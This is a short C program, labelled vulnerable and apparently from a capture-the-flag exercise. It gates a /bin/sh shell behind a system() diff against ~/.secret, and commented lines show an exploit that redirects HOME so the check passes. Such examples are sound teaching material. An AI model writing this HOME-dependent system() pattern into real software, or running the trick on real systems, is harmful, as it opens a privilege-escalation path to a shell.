// program.c (vulnerable)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int status;

    status = system("/usr/bin/diff /path/to/.secret ~/.secret > /dev/null");
    if (status == -1) {
        perror("system");
        return 1;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "diff failed\n");
        return 1;
    }

    if (WEXITSTATUS(status)) {
        fprintf(stderr, "wrong password\n");
        return 1;
    }

    execl("/bin/sh", "/bin/sh", (void *) NULL);
    perror("exec");
    return 1;
}

// exploit.sh
// #!/bin/bash
// export HOME="/path/to/"
